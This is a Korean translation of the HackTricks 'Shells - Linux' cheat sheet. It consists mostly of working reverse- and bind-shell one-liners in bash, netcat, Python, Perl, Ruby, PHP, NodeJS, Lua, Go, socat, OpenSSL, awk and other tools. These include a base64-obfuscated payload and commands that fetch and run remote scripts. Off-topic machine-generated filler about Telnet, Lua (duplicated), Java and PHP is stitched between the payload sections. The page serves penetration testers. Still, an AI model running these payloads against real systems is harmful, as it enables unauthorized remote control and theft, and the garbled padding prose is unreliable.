# 쉘 - 리눅스

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정하세요. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**이 쉘 중 어떤 것에 대한 질문이 있다면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인**할 수 있습니다.

## Full TTY

**리버스 쉘을 획득한 후**[ **이 페이지를 읽어 전체 TTY를 얻으세요**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
다른 쉘들도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, 그리고 bash.

### 심볼 안전한 쉘
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### 쉘 설명

1. **`bash -i`**: 이 명령어는 대화형 (`-i`) Bash 쉘을 시작합니다.
2. **`>&`**: 이 명령어는 **표준 출력** (`stdout`)과 **표준 에러** (`stderr`)를 **동일한 대상으로 리디렉션**하는 약식 표기법입니다.
3. **`/dev/tcp/<공격자-IP>/<포트>`**: 이는 지정된 IP 주소와 포트로의 TCP 연결을 나타내는 특수한 파일입니다.
* 출력 및 에러 스트림을 이 파일로 리디렉션함으로써, 명령어는 대화형 쉘 세션의 출력을 공격자의 기기로 전송합니다.
4. **`0>&1`**: 이 명령어는 표준 입력 (`stdin`)을 표준 출력 (`stdout`)과 동일한 대상으로 리디렉션합니다.

### 파일 생성 및 실행
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## 포워드 쉘

리눅스 기반 웹 애플리케이션에서 **RCE 취약점**을 만나게 되면, Iptables 규칙이나 다른 필터의 존재로 인해 **역쉘이 얻기 어려운 경우**가 있을 수 있습니다. 이러한 시나리오에서는 파이프를 사용하여 침투된 시스템 내에서 PTY 쉘을 생성하는 것을 고려해야 합니다.

코드는 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)에서 찾을 수 있습니다.

다음을 수정하면 됩니다:

* 취약한 호스트의 URL
* 페이로드의 접두사와 접미사 (있는 경우)
* 페이로드가 전송되는 방식 (헤더? 데이터? 추가 정보?)

그런 다음, 명령을 **보내거나 심지어 `upgrade` 명령을 사용**하여 전체 PTY를 얻을 수 있습니다 (파이프는 약 1.3초의 지연으로 읽고 쓰입니다). 

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)에서 확인하세요.
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet은 원격 컴퓨터에 접속하기 위한 네트워크 프로토콜입니다. Telnet 클라이언트를 사용하여 Telnet 서버에 연결하고, 명령어를 입력하여 원격 시스템을 제어할 수 있습니다.

Telnet은 기본적으로 평문으로 통신하기 때문에 보안에 취약합니다. 따라서, 보안을 강화하기 위해 SSH(Secure Shell)와 같은 암호화된 프로토콜을 사용하는 것이 좋습니다.

Telnet을 사용하여 원격 시스템에 접속하려면 다음과 같은 단계를 따릅니다:

1. 명령 프롬프트에서 `telnet <호스트>`를 입력하여 Telnet 클라이언트를 실행합니다.
2. Telnet 서버의 IP 주소나 도메인 이름을 입력합니다.
3. Telnet 서버에 연결되면 로그인 프롬프트가 표시됩니다. 사용자 이름과 암호를 입력하여 로그인합니다.
4. 로그인에 성공하면, 원격 시스템에 명령어를 입력하여 제어할 수 있습니다.
5. 작업을 마치면 `exit` 명령어를 사용하여 Telnet 세션을 종료합니다.

Telnet은 네트워크 관리, 원격 접속, 디버깅 등에 유용하게 사용될 수 있습니다. 그러나 보안상의 이유로 SSH와 같은 보안 프로토콜을 사용하는 것이 권장됩니다.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**공격자**
```bash
while true; do nc -l <port>; done
```
명령을 보내려면 명령을 작성하고 엔터를 누르고 CTRL+D를 누르세요 (STDIN을 중지하기 위해)

**피해자**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## 파이썬

Python is a versatile programming language that is widely used in the hacking community. It is known for its simplicity and readability, making it a popular choice for both beginners and experienced hackers.

파이썬은 다재다능한 프로그래밍 언어로, 해킹 커뮤니티에서 널리 사용됩니다. 간결하고 가독성이 좋아 초보자와 숙련된 해커 모두에게 인기가 있습니다.

Python provides a wide range of libraries and modules that can be used for various hacking tasks. These include libraries for network scanning, web scraping, password cracking, and much more. The extensive collection of libraries makes Python a powerful tool for hackers.

파이썬은 다양한 해킹 작업에 사용할 수 있는 라이브러리와 모듈을 제공합니다. 이에는 네트워크 스캐닝, 웹 스크래핑, 패스워드 크래킹 등을 위한 라이브러리가 포함됩니다. 다양한 라이브러리의 수많은 컬렉션은 파이썬을 해커에게 강력한 도구로 만듭니다.

Python also has a rich ecosystem of frameworks and tools that can aid in the hacking process. Frameworks like Metasploit and Scapy provide pre-built functionalities for common hacking tasks, while tools like Burp Suite and Wireshark offer powerful features for network analysis and penetration testing.

파이썬은 해킹 과정을 돕는 다양한 프레임워크와 도구의 풍부한 생태계를 가지고 있습니다. Metasploit과 Scapy와 같은 프레임워크는 일반적인 해킹 작업을 위한 미리 구축된 기능을 제공하며, Burp Suite와 Wireshark와 같은 도구는 네트워크 분석과 펜테스팅에 강력한 기능을 제공합니다.

Python's versatility and extensive community support make it an excellent choice for hackers of all skill levels. Whether you are a beginner looking to learn the basics of hacking or an experienced hacker looking to automate complex tasks, Python has something to offer.

파이썬의 다재다능함과 광범위한 커뮤니티 지원은 모든 기술 수준의 해커에게 탁월한 선택입니다. 해킹의 기본을 배우려는 초보자이든 복잡한 작업을 자동화하려는 숙련된 해커이든, 파이썬은 항상 도움이 될 것입니다.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl은 강력하고 다목적인 스크립팅 언어입니다. Perl을 사용하여 리눅스 시스템에서 다양한 작업을 자동화할 수 있습니다. Perl은 간단한 한 줄의 명령부터 복잡한 스크립트까지 다양한 용도로 사용됩니다.

### Perl 설치

Perl을 설치하려면 다음 명령을 사용하세요.

```bash
sudo apt-get install perl
```

### Perl 스크립트 실행

Perl 스크립트를 실행하려면 다음 명령을 사용하세요.

```bash
perl script.pl
```

### Perl 원격 쉘

Perl을 사용하여 원격 쉘을 실행할 수 있습니다. 다음은 Perl을 사용하여 원격 쉘을 실행하는 예입니다.

```perl
use IO::Socket;

$ip = "10.10.10.10";
$port = 1234;

$socket = IO::Socket::INET->new(PeerAddr => $ip, PeerPort => $port, Proto => "tcp");
if ($socket) {
    open(STDIN, ">&", $socket);
    open(STDOUT, ">&", $socket);
    open(STDERR, ">&", $socket);
    exec("/bin/sh -i");
}
```

위의 스크립트를 실행하면 원격 서버에 쉘을 얻을 수 있습니다.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## 루비

루비는 동적인 객체 지향 프로그래밍 언어로, 간결하고 읽기 쉬운 문법을 가지고 있습니다. 루비는 다양한 운영 체제에서 사용할 수 있으며, 특히 웹 개발에 많이 사용됩니다. 루비는 강력한 메타프로그래밍 기능을 제공하며, 다른 언어와의 통합이 용이합니다.

루비를 사용하여 쉘을 제어하는 방법은 다음과 같습니다:

### 명령 실행

루비에서 명령을 실행하려면 `system`, `exec`, `backticks` 또는 `%x{}`를 사용할 수 있습니다. 예를 들어:

```ruby
system("ls -la")
exec("ls -la")
output = `ls -la`
output = %x{ls -la}
```

### 쉘 스크립트 실행

루비에서 쉘 스크립트를 실행하려면 `system`, `exec`, `backticks` 또는 `%x{}`를 사용할 수 있습니다. 예를 들어:

```ruby
system("sh script.sh")
exec("sh script.sh")
output = `sh script.sh`
output = %x{sh script.sh}
```

### 쉘 명령어 인젝션

루비에서 쉘 명령어 인젝션을 방지하기 위해 `Shellwords.escape`를 사용할 수 있습니다. 예를 들어:

```ruby
input = params[:input]
escaped_input = Shellwords.escape(input)
system("echo #{escaped_input}")
```

### 쉘 세션 유지

루비에서 쉘 세션을 유지하려면 `PTY.spawn`을 사용할 수 있습니다. 예를 들어:

```ruby
require 'pty'

PTY.spawn("/bin/bash") do |stdin, stdout, pid|
  stdin.puts "ls -la"
  stdin.puts "exit"
  stdout.each { |line| puts line }
end
```

루비를 사용하여 쉘을 제어하는 방법에 대한 간단한 소개였습니다. 루비의 다양한 기능을 활용하여 더욱 강력한 쉘 제어 기법을 개발할 수 있습니다.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP는 웹 개발에 널리 사용되는 스크립트 언어입니다. PHP는 서버 측에서 실행되며, HTML과 함께 사용하여 동적 웹 페이지를 생성하고 데이터베이스와 상호 작용할 수 있습니다.

### PHP 셸

PHP 셸은 명령 줄에서 PHP 코드를 실행하는 도구입니다. 이를 통해 명령 줄에서 PHP 스크립트를 실행하고 결과를 확인할 수 있습니다.

#### PHP 셸 시작하기

PHP 셸을 시작하려면 터미널에서 `php -a` 명령을 실행합니다.

```bash
$ php -a
Interactive shell

php >
```

#### PHP 코드 실행하기

PHP 셸에서 PHP 코드를 실행하려면 코드를 입력하고 `Enter` 키를 누릅니다. 코드의 결과가 표시됩니다.

```bash
php > echo "Hello, World!";
Hello, World!
```

#### PHP 셸 종료하기

PHP 셸을 종료하려면 `exit` 또는 `quit` 명령을 입력하고 `Enter` 키를 누릅니다.

```bash
php > exit
$
```

### PHP 웹 셸

PHP 웹 셸은 웹 서버에서 PHP 코드를 실행하는 도구입니다. 이를 통해 웹 애플리케이션에 대한 원격 코드 실행이 가능합니다.

#### PHP 웹 셸 사용하기

PHP 웹 셸을 사용하려면 웹 서버에 PHP 파일을 업로드하고 해당 파일을 실행해야 합니다. 웹 셸을 사용하여 원격으로 PHP 코드를 실행하고 결과를 확인할 수 있습니다.

```php
<?php
    echo "Hello, World!";
?>
```

#### PHP 웹 셸 보안 주의사항

PHP 웹 셸은 보안 위험이 있으므로 신중하게 사용해야 합니다. 웹 셸을 사용할 때는 적절한 인증 및 권한 제어를 설정하여 불필요한 악용을 방지해야 합니다.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## 자바

Java는 객체 지향 프로그래밍 언어로, 다양한 플랫폼에서 실행될 수 있는 유연하고 안정적인 어플리케이션을 개발하는 데 사용됩니다. Java는 가상 머신을 통해 실행되며, 이를 통해 다른 운영 체제에서도 동일한 코드를 실행할 수 있습니다. Java는 다양한 용도로 사용되며, 웹 애플리케이션, 모바일 애플리케이션, 게임 등을 개발하는 데에도 널리 사용됩니다.

Java는 다양한 기능과 라이브러리를 제공하며, 개발자들은 이를 활용하여 효율적이고 강력한 어플리케이션을 개발할 수 있습니다. 또한 Java는 보안 기능이 강화되어 있어, 안전한 애플리케이션을 개발하는 데에도 적합합니다.

Java는 다른 언어와의 통합이 용이하며, 다양한 개발 도구와 프레임워크를 지원합니다. 이를 통해 개발자들은 더욱 효율적으로 개발을 진행할 수 있습니다.

Java는 많은 기업과 개발자들에게 신뢰받는 언어로 알려져 있으며, 계속해서 발전하고 있는 언어입니다. 따라서 Java를 배우고 익히는 것은 개발자로서의 역량을 향상시키는 데에 큰 도움이 될 것입니다.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat은 Netcat의 개선된 버전으로, 네트워크 연결을 생성하고 관리하기 위한 강력한 도구입니다. Ncat은 다양한 기능을 제공하며, TCP 및 UDP 포트 스캐닝, 포트 포워딩, 파일 전송, 원격 쉘 및 스크립트 실행 등을 지원합니다.

Ncat을 사용하여 원격 시스템에 접속하려면 다음 명령을 사용합니다:

```
ncat <target_ip> <port>
```

Ncat은 다양한 옵션을 제공하여 사용자가 원하는 방식으로 동작하도록 설정할 수 있습니다. 몇 가지 유용한 옵션은 다음과 같습니다:

- `-l` 옵션은 Ncat을 리스닝 모드로 실행합니다.
- `-p` 옵션은 특정 포트를 지정합니다.
- `-e` 옵션은 외부 프로그램을 실행하여 원격 쉘을 제공합니다.
- `-u` 옵션은 UDP 프로토콜을 사용합니다.

Ncat은 다른 시스템과의 통신을 위해 사용되는 매우 강력한 도구이므로, 적절한 권한과 책임을 가지고 사용해야 합니다.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua는 간단하고 가벼운 스크립팅 언어로, 다양한 운영 체제에서 사용할 수 있습니다. Lua는 C로 작성되어 있으며, C 코드와 함께 사용하기에 적합합니다. Lua는 스크립트 언어로 사용되기 때문에, 다른 프로그래밍 언어와 함께 사용할 수 있습니다.

Lua는 다양한 용도로 사용될 수 있습니다. 예를 들어, 게임 개발, 웹 개발, 임베디드 시스템, 데이터 분석 등에 사용될 수 있습니다. Lua는 간단하고 직관적인 문법을 가지고 있으며, 빠른 실행 속도를 제공합니다.

Lua는 다양한 확장 기능을 제공하며, 사용자 정의 함수와 모듈을 작성할 수 있습니다. 또한, Lua는 강력한 문자열 처리 기능을 제공하며, 테이블을 사용하여 데이터를 구조화할 수 있습니다.

Lua는 다양한 방법으로 실행될 수 있습니다. 예를 들어, 명령 줄에서 직접 실행하거나, Lua 인터프리터를 사용하여 실행할 수 있습니다. 또한, Lua 스크립트를 다른 프로그램에 포함시켜 사용할 수도 있습니다.

Lua는 다양한 운영 체제에서 사용할 수 있으며, 다양한 플랫폼에서 지원됩니다. Lua는 또한 다양한 라이브러리와 프레임워크를 제공하며, 이를 통해 더욱 강력한 기능을 구현할 수 있습니다.

Lua는 간단하고 가벼운 스크립팅 언어로, 다양한 운영 체제에서 사용할 수 있습니다. Lua는 C로 작성되어 있으며, C 코드와 함께 사용하기에 적합합니다. Lua는 스크립트 언어로 사용되기 때문에, 다른 프로그래밍 언어와 함께 사용할 수 있습니다.

Lua는 다양한 용도로 사용될 수 있습니다. 예를 들어, 게임 개발, 웹 개발, 임베디드 시스템, 데이터 분석 등에 사용될 수 있습니다. Lua는 간단하고 직관적인 문법을 가지고 있으며, 빠른 실행 속도를 제공합니다.

Lua는 다양한 확장 기능을 제공하며, 사용자 정의 함수와 모듈을 작성할 수 있습니다. 또한, Lua는 강력한 문자열 처리 기능을 제공하며, 테이블을 사용하여 데이터를 구조화할 수 있습니다.

Lua는 다양한 방법으로 실행될 수 있습니다. 예를 들어, 명령 줄에서 직접 실행하거나, Lua 인터프리터를 사용하여 실행할 수 있습니다. 또한, Lua 스크립트를 다른 프로그램에 포함시켜 사용할 수도 있습니다.

Lua는 다양한 운영 체제에서 사용할 수 있으며, 다양한 플랫폼에서 지원됩니다. Lua는 또한 다양한 라이브러리와 프레임워크를 제공하며, 이를 통해 더욱 강력한 기능을 구현할 수 있습니다.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS는 JavaScript를 실행할 수 있는 서버 사이드 플랫폼입니다. 이는 비동기 이벤트 기반 아키텍처를 사용하여 높은 확장성을 제공합니다. NodeJS는 단일 스레드로 작동하지만, 이벤트 루프를 통해 동시성을 처리할 수 있습니다.

### NodeJS 설치

NodeJS를 설치하려면 다음 명령을 실행하세요:

```bash
sudo apt-get install nodejs
```

### NodeJS 실행

NodeJS를 실행하려면 다음 명령을 사용하세요:

```bash
node <파일명.js>
```

### NodeJS 패키지 관리자 (npm)

NodeJS 패키지 관리자인 npm은 NodeJS 애플리케이션을 위한 패키지 설치 및 관리를 담당합니다. npm을 사용하여 패키지를 설치하려면 다음 명령을 실행하세요:

```bash
npm install <패키지명>
```

### NodeJS 웹 서버

NodeJS를 사용하여 간단한 웹 서버를 만들 수 있습니다. 다음은 NodeJS를 사용하여 웹 서버를 만드는 예시입니다:

```javascript
const http = require('http');

const hostname = '127.0.0.1';
const port = 3000;

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello, World!\n');
});

server.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});
```

위의 코드를 `server.js` 파일로 저장하고 다음 명령을 실행하여 웹 서버를 시작할 수 있습니다:

```bash
node server.js
```

이제 `http://127.0.0.1:3000/`에 접속하면 "Hello, World!"라는 메시지가 표시됩니다.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

공격자 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
피해자
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 바인드 쉘
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### 리버스 쉘

리버스 쉘은 원격 시스템에 접근하기 위해 사용되는 기술입니다. 일반적으로 공격자는 피해 시스템에 악성 코드를 삽입하고, 해당 코드는 공격자가 제어하는 서버로 연결을 시도합니다. 이렇게 되면 공격자는 원격 시스템에 대한 완전한 제어권을 획득할 수 있습니다. 리버스 쉘은 특히 방화벽이나 NAT(Network Address Translation)과 같은 보안 장치를 우회하는 데에 유용합니다.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk은 텍스트 처리 도구로, 행 단위로 작동합니다. 각 행은 필드로 구성되어 있으며, 기본적으로 공백 문자로 구분됩니다. Awk는 행을 읽고 패턴에 일치하는 행을 처리하는 강력한 기능을 제공합니다.

Awk는 다양한 용도로 사용될 수 있습니다. 예를 들어, 특정 패턴을 가진 행을 필터링하거나 특정 필드를 추출하거나 행을 조작하여 원하는 형식으로 출력할 수 있습니다.

Awk는 명령줄에서 직접 실행할 수도 있고, 스크립트 파일로 작성하여 실행할 수도 있습니다. Awk 스크립트는 패턴-동작 쌍으로 구성되며, 패턴에 일치하는 행에 대해 지정된 동작을 수행합니다.

Awk는 다양한 내장 함수와 변수를 제공하여 텍스트 처리 작업을 더욱 효율적으로 수행할 수 있습니다. 이러한 함수와 변수를 활용하여 Awk 스크립트를 작성하면 텍스트 처리 작업을 더욱 간단하고 효율적으로 수행할 수 있습니다.

Awk는 다른 리눅스 명령어와 함께 사용되어 강력한 텍스트 처리 도구로 활용될 수 있습니다. Awk를 잘 활용하면 텍스트 데이터를 효율적으로 처리하고 원하는 결과를 얻을 수 있습니다.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### 손가락

**공격자**
```bash
while true; do nc -l 79; done
```
명령을 보내려면 명령을 작성하고 엔터를 누르고 CTRL+D를 누르세요 (STDIN을 중지하기 위해)

**피해자**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk는 AWK 프로그래밍 언어의 GNU 구현체입니다. AWK는 텍스트 처리에 사용되는 강력한 도구로, 행 단위로 작동합니다. Gawk는 다양한 기능을 제공하며, 텍스트 파일에서 데이터를 추출하고 가공하는 데 사용할 수 있습니다.

Gawk를 사용하여 텍스트 파일을 처리하려면 다음과 같은 명령어를 사용할 수 있습니다.

- `awk '{pattern}' file`: 파일에서 패턴과 일치하는 행을 출력합니다.
- `awk '{print}' file`: 파일의 모든 행을 출력합니다.
- `awk '{print $1}' file`: 파일의 각 행의 첫 번째 필드를 출력합니다.
- `awk '{print $1, $2}' file`: 파일의 각 행의 첫 번째와 두 번째 필드를 출력합니다.

Gawk는 변수, 조건문, 반복문 등의 기능도 제공합니다. 이를 통해 텍스트 파일을 보다 복잡하게 처리할 수 있습니다.

Gawk는 명령줄에서 직접 실행할 수도 있고, 스크립트 파일에 작성하여 실행할 수도 있습니다. 스크립트 파일을 작성할 때는 AWK의 문법을 따라야 합니다.

Gawk는 텍스트 처리에 유용한 도구이며, 특히 로그 파일 분석이나 데이터 추출 작업에 자주 사용됩니다.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

이는 시스템의 포트 6001에 연결을 시도합니다:
```bash
xterm -display 10.0.0.1:1
```
리버스 쉘을 잡기 위해 다음을 사용할 수 있습니다 (포트 6001에서 수신 대기):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 참고: Java 역쉘이 Groovy에서도 작동합니다.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 참고 자료
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
